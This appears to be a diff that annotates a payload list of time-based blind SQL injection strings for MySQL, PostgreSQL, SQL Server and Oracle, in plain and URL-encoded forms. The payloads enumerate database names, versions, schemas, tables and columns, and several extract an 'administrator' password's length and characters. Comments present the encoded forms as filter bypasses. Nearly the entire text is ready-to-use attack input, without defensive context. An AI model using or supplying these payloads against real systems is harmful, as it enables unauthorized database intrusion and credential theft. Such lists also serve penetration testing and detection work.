@@ -1,40 +1,73 @@
+# MySQL: time-based char probe on database() first char; SLEEP(5) when true. Adjust index/threshold.
 ' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))>77,SLEEP(5),0)-- 
+# SQL Server: WAITFOR DELAY via DB_NAME() first char > 77; adjust delay to RTT.
 '; IF(ASCII(SUBSTRING(DB_NAME(),1,1))>77) WAITFOR DELAY '0:0:5'-- 
+# PostgreSQL: time-based char probe on current_user; pg_sleep(5) when true.
 ' AND CASE WHEN (ASCII(SUBSTRING((SELECT current_user),1,1))>77) THEN pg_sleep(5) ELSE pg_sleep(0) END-- 
+# PostgreSQL (URL-encoded): baseline true causing sleep; useful for filter bypass.
 '%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+# PostgreSQL (URL-encoded): sleep if admin user exists.
 '%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+# PostgreSQL (URL-encoded): sleep if admin password length > 1.
 '%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+# PostgreSQL (URL-encoded): incremental length probes for admin password.
 '%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>5)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
 '%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>10)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
 '%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>15)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
 '%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>20)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
 '%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>25)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+# PostgreSQL (URL-encoded): extract specific password chars by equality.
 '%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
 '%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+# Oracle: sleep via dbms_pipe.receive_message; char probe on USER first char.
 AND CASE WHEN (ASCII(SUBSTR((SELECT USER FROM dual),1,1))>77) THEN dbms_pipe.receive_message(('a'),5) ELSE NULL END FROM dual
+# PostgreSQL: DB name first char probe; 5s sleep when true.
 ' AND CASE WHEN (ASCII(SUBSTRING((SELECT current_database()),1,1))>77) THEN pg_sleep(5) ELSE pg_sleep(0) END-- 
+# PostgreSQL: DB name length > 5; time-based boolean.
 ' AND CASE WHEN (LENGTH(current_database())>5) THEN pg_sleep(5) ELSE pg_sleep(0) END-- 
+# PostgreSQL: version banner first char probe.
 ' AND CASE WHEN (ASCII(SUBSTRING((SELECT version()),1,1))>77) THEN pg_sleep(5) ELSE pg_sleep(0) END-- 
+# PostgreSQL: at least one schema exists.
 ' AND CASE WHEN ((SELECT COUNT(*) FROM information_schema.schemata)>0) THEN pg_sleep(5) ELSE pg_sleep(0) END-- 
+# PostgreSQL: enumerate schema names; iterate OFFSET to walk list.
 ' AND CASE WHEN (ASCII(SUBSTRING((SELECT schema_name FROM information_schema.schemata ORDER BY schema_name LIMIT 1 OFFSET 0),1,1))>77) THEN pg_sleep(5) ELSE pg_sleep(0) END-- 
+# PostgreSQL: next schema (OFFSET 1) enumeration.
 ' AND CASE WHEN (ASCII(SUBSTRING((SELECT schema_name FROM information_schema.schemata ORDER BY schema_name LIMIT 1 OFFSET 1),1,1))>77) THEN pg_sleep(5) ELSE pg_sleep(0) END-- 
+# PostgreSQL: tables exist in public schema.
 ' AND CASE WHEN ((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='public')>0) THEN pg_sleep(5) ELSE pg_sleep(0) END-- 
+# PostgreSQL: first table name in public schema; first char probe.
 ' AND CASE WHEN (ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='public' ORDER BY table_name LIMIT 1 OFFSET 0),1,1))>77) THEN pg_sleep(5) ELSE pg_sleep(0) END-- 
+# PostgreSQL: same table enumeration in current_schema().
 ' AND CASE WHEN (ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=current_schema() ORDER BY table_name LIMIT 1 OFFSET 0),1,1))>77) THEN pg_sleep(5) ELSE pg_sleep(0) END-- 
+# PostgreSQL: enumerate columns in public schema; first char probe.
 ' AND CASE WHEN (ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema='public' AND table_name=(SELECT table_name FROM information_schema.tables WHERE table_schema='public' ORDER BY table_name LIMIT 1 OFFSET 0) ORDER BY column_name LIMIT 1 OFFSET 0),1,1))>77) THEN pg_sleep(5) ELSE pg_sleep(0) END-- 
+# PostgreSQL: enumerate columns in current_schema(); ordinal_position ordering.
 ' AND CASE WHEN (ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema=current_schema() AND table_name=(SELECT table_name FROM information_schema.tables WHERE table_schema=current_schema() ORDER BY table_name LIMIT 1 OFFSET 0) ORDER BY ordinal_position LIMIT 1 OFFSET 0),1,1))>77) THEN pg_sleep(5) ELSE pg_sleep(0) END-- 
+# PostgreSQL (URL-encoded): DB name length > 5.
 '%3BSELECT+CASE+WHEN+(LENGTH(current_database())%3E5)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+# PostgreSQL (URL-encoded): first schema name first char probe.
 '%3BSELECT+CASE+WHEN+(ASCII(SUBSTRING((SELECT+schema_name+FROM+information_schema.schemata+ORDER+BY+schema_name+LIMIT+1+OFFSET+0),1,1))%3E77)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+# PostgreSQL (URL-encoded): existence of users table in public schema.
 '%3BSELECT+CASE+WHEN+EXISTS(SELECT+1+FROM+information_schema.tables+WHERE+table_schema%3D'public'+AND+table_name%3D'users')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+# PostgreSQL (URL-encoded): DB name first char probe.
 '%3BSELECT+CASE+WHEN+(ASCII(SUBSTRING((SELECT+current_database()),1,1))%3E77)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+# PostgreSQL (URL-encoded): version first char probe.
 '%3BSELECT+CASE+WHEN+(ASCII(SUBSTRING((SELECT+version()),1,1))%3E77)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+# PostgreSQL (URL-encoded): schema count existence.
 '%3BSELECT+CASE+WHEN+((SELECT+COUNT(*)+FROM+information_schema.schemata)%3E0)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+# PostgreSQL (URL-encoded): next schema (OFFSET 1) enumeration.
 '%3BSELECT+CASE+WHEN+(ASCII(SUBSTRING((SELECT+schema_name+FROM+information_schema.schemata+ORDER+BY+schema_name+LIMIT+1+OFFSET+1),1,1))%3E77)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+# PostgreSQL (URL-encoded): any tables in public schema.
 '%3BSELECT+CASE+WHEN+((SELECT+COUNT(*)+FROM+information_schema.tables+WHERE+table_schema%3D'public')%3E0)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+# PostgreSQL (URL-encoded): first table name in public schema; first char probe.
 '%3BSELECT+CASE+WHEN+(ASCII(SUBSTRING((SELECT+table_name+FROM+information_schema.tables+WHERE+table_schema%3D'public'+ORDER+BY+table_name+LIMIT+1+OFFSET+0),1,1))%3E77)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+# PostgreSQL (URL-encoded): same table enumeration in current_schema().
 '%3BSELECT+CASE+WHEN+(ASCII(SUBSTRING((SELECT+table_name+FROM+information_schema.tables+WHERE+table_schema%3Dcurrent_schema()+ORDER+BY+table_name+LIMIT+1+OFFSET+0),1,1))%3E77)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+# PostgreSQL (URL-encoded): first column name in public schema table; first char probe.
 '%3BSELECT+CASE+WHEN+(ASCII(SUBSTRING((SELECT+column_name+FROM+information_schema.columns+WHERE+table_schema%3D'public'+AND+table_name%3D(SELECT+table_name+FROM+information_schema.tables+WHERE+table_schema%3D'public'+ORDER+BY+table_name+LIMIT+1+OFFSET+0)+ORDER+BY+column_name+LIMIT+1+OFFSET+0),1,1))%3E77)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+# PostgreSQL (URL-encoded): first column name in current_schema() table; ordinal_position ordering.
 '%3BSELECT+CASE+WHEN+(ASCII(SUBSTRING((SELECT+column_name+FROM+information_schema.columns+WHERE+table_schema%3Dcurrent_schema()+AND+table_name%3D(SELECT+table_name+FROM+information_schema.tables+WHERE+table_schema%3Dcurrent_schema()+ORDER+BY+table_name+LIMIT+1+OFFSET+0)+ORDER+BY+ordinal_position+LIMIT+1+OFFSET+0),1,1))%3E77)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+# SQL Server: WAITFOR DELAY length and char probes; time-based boolean.
 '; IF (LEN(DB_NAME())>5) WAITFOR DELAY '0:0:5'-- 
 '; IF (ASCII(SUBSTRING(DB_NAME(),1,1))>77) WAITFOR DELAY '0:0:5'-- 
 '; IF (ASCII(SUBSTRING(@@version,1,1))>77) WAITFOR DELAY '0:0:5'-- 
@@ -43,6 +76,7 @@ AND CASE WHEN (ASCII(SUBSTR((SELECT USER FROM dual),1,1))>77) THEN dbms_pipe.rec
 '; IF ((SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='dbo')>0) WAITFOR DELAY '0:0:5'-- 
 '; IF (ASCII(SUBSTRING((SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='dbo' ORDER BY TABLE_NAME),1,1))>77) WAITFOR DELAY '0:0:5'-- 
 '; IF (ASCII(SUBSTRING((SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='dbo' AND TABLE_NAME=(SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='dbo' ORDER BY TABLE_NAME) ORDER BY ORDINAL_POSITION),1,1))>77) WAITFOR DELAY '0:0:5'-- 
+# SQL Server (URL-encoded): WAITFOR variants to bypass filters.
 '%3BIF+(LEN(DB_NAME())%3E5)+WAITFOR+DELAY+'0%3A0%3A10'--
 '%3BIF+(EXISTS(SELECT+1+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA%3D'dbo'+AND+TABLE_NAME%3D'users'))+WAITFOR+DELAY+'0%3A0%3A10'--
 '%3BIF+(ASCII(SUBSTRING(DB_NAME(),1,1))%3E77)+WAITFOR+DELAY+'0%3A0%3A10'--
@@ -52,6 +86,7 @@ AND CASE WHEN (ASCII(SUBSTR((SELECT USER FROM dual),1,1))>77) THEN dbms_pipe.rec
 '%3BIF+((SELECT+COUNT(*)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA%3D'dbo')%3E0)+WAITFOR+DELAY+'0%3A0%3A10'--
 '%3BIF+(ASCII(SUBSTRING((SELECT+TOP+1+TABLE_NAME+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA%3D'dbo'+ORDER+BY+TABLE_NAME),1,1))%3E77)+WAITFOR+DELAY+'0%3A0%3A10'--
 '%3BIF+(ASCII(SUBSTRING((SELECT+TOP+1+COLUMN_NAME+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_SCHEMA%3D'dbo'+AND+TABLE_NAME%3D(SELECT+TOP+1+TABLE_NAME+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA%3D'dbo'+ORDER+BY+TABLE_NAME)+ORDER+BY+ORDINAL_POSITION),1,1))%3E77)+WAITFOR+DELAY+'0%3A0%3A10'--
+# Oracle: dbms_pipe time-based probes for DB name, banner, users, tables, columns.
 ' AND CASE WHEN (LENGTH(SYS_CONTEXT(''USERENV'',''DB_NAME''))>5) THEN dbms_pipe.receive_message(('a'),5) ELSE NULL END FROM dual
 ' AND CASE WHEN (ASCII(SUBSTR(SYS_CONTEXT(''USERENV'',''DB_NAME''),1,1))>77) THEN dbms_pipe.receive_message(('a'),5) ELSE NULL END FROM dual
 ' AND CASE WHEN (ASCII(SUBSTR((SELECT banner FROM v$version WHERE ROWNUM=1),1,1))>77) THEN dbms_pipe.receive_message(('a'),5) ELSE NULL END FROM dual
@@ -60,6 +95,7 @@ AND CASE WHEN (ASCII(SUBSTR((SELECT USER FROM dual),1,1))>77) THEN dbms_pipe.rec
 ' AND CASE WHEN ((SELECT COUNT(*) FROM user_tables)>0) THEN dbms_pipe.receive_message(('a'),5) ELSE NULL END FROM dual
 ' AND CASE WHEN (ASCII(SUBSTR((SELECT table_name FROM (SELECT table_name FROM user_tables ORDER BY table_name) WHERE ROWNUM=1),1,1))>77) THEN dbms_pipe.receive_message(('a'),5) ELSE NULL END FROM dual
 ' AND CASE WHEN (ASCII(SUBSTR((SELECT column_name FROM (SELECT column_name FROM user_tab_columns WHERE table_name=(SELECT table_name FROM (SELECT table_name FROM user_tables ORDER BY table_name) WHERE ROWNUM=1) ORDER BY column_id) WHERE ROWNUM=1),1,1))>77) THEN dbms_pipe.receive_message(('a'),5) ELSE NULL END FROM dual
+# MySQL: IF(..., SLEEP(5), 0) probes for DB, version, schema/table/column enumeration.
 ' AND IF(LENGTH(DATABASE())>5,SLEEP(5),0)-- 
 ' AND IF(ASCII(SUBSTRING((SELECT VERSION()),1,1))>77,SLEEP(5),0)-- 
 ' AND IF((SELECT COUNT(*) FROM information_schema.schemata)>0,SLEEP(5),0)-- 
@@ -67,6 +103,7 @@ AND CASE WHEN (ASCII(SUBSTR((SELECT USER FROM dual),1,1))>77) THEN dbms_pipe.rec
 ' AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>0,SLEEP(5),0)-- 
 ' AND IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name LIMIT 1 OFFSET 0),1,1))>77,SLEEP(5),0)-- 
 ' AND IF(ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name=(SELECT table_name FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name LIMIT 1 OFFSET 0) ORDER BY ordinal_position LIMIT 1 OFFSET 0),1,1))>77,SLEEP(5),0)-- 
+# MySQL (URL-encoded): SLEEP(10) variants for filter bypass.
 '%3BSELECT+IF(LENGTH(DATABASE())%3E5,SLEEP(10),0)--
 '%3BSELECT+IF(EXISTS(SELECT+1+FROM+information_schema.tables+WHERE+table_schema%3DDATABASE()+AND+table_name%3D'users'),SLEEP(10),0)--
 '%3BSELECT+IF(ASCII(SUBSTRING((SELECT+VERSION()),1,1))%3E77,SLEEP(10),0)--
@@ -75,6 +112,7 @@ AND CASE WHEN (ASCII(SUBSTR((SELECT USER FROM dual),1,1))>77) THEN dbms_pipe.rec
 '%3BSELECT+IF((SELECT+COUNT(*)+FROM+information_schema.tables+WHERE+table_schema%3DDATABASE())%3E0,SLEEP(10),0)--
 '%3BSELECT+IF(ASCII(SUBSTRING((SELECT+table_name+FROM+information_schema.tables+WHERE+table_schema%3DDATABASE()+ORDER+BY+table_name+LIMIT+1+OFFSET+0),1,1))%3E77,SLEEP(10),0)--
 '%3BSELECT+IF(ASCII(SUBSTRING((SELECT+column_name+FROM+information_schema.columns+WHERE+table_schema%3DDATABASE()+AND+table_name%3D(SELECT+table_name+FROM+information_schema.tables+WHERE+table_schema%3DDATABASE()+ORDER+BY+table_name+LIMIT+1+OFFSET+0)+ORDER+BY+ordinal_position+LIMIT+1+OFFSET+0),1,1))%3E77,SLEEP(10),0)--
+# Oracle (URL-encoded): dbms_pipe variants; 10s receive_message as time source.
 '%3BSELECT+CASE+WHEN+(LENGTH(SYS_CONTEXT(''USERENV'',''DB_NAME''))%3E5)+THEN+dbms_pipe.receive_message(('a'),10)+ELSE+NULL+END+FROM+dual--
 '%3BSELECT+CASE+WHEN+(ASCII(SUBSTR(SYS_CONTEXT(''USERENV'',''DB_NAME''),1,1))%3E77)+THEN+dbms_pipe.receive_message(('a'),10)+ELSE+NULL+END+FROM+dual--
 '%3BSELECT+CASE+WHEN+(ASCII(SUBSTR((SELECT+banner+FROM+v$version+WHERE+ROWNUM%3D1),1,1))%3E77)+THEN+dbms_pipe.receive_message(('a'),10)+ELSE+NULL+END+FROM+dual--
